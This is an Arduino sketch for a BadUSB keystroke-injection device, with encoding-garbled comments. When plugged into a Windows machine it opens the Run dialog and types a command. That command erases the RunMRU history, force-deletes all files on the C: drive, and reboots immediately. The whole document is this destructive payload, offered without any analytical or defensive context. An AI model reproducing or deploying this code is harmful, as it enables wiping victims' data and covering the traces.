void setup() {//��ʼ��
  Keyboard.begin();//��ʼ����ͨѶ 
  delay(5000);//��ʱ
  Keyboard.press(KEY_LEFT_GUI);//win�� 
  delay(500); 
  Keyboard.press('r');//r�� 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&COPY C:\\WINDOWS\\SYSTEM32\\SHUTDOWN.EXE D:\\SHUTDOWN.EXE /y&DEL /S /F /Q C:\\*&D:\\SHUTDOWN.EXE -R -F -T 0")
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//��������ͨѶ 
}
void loop()//ѭ��
{
}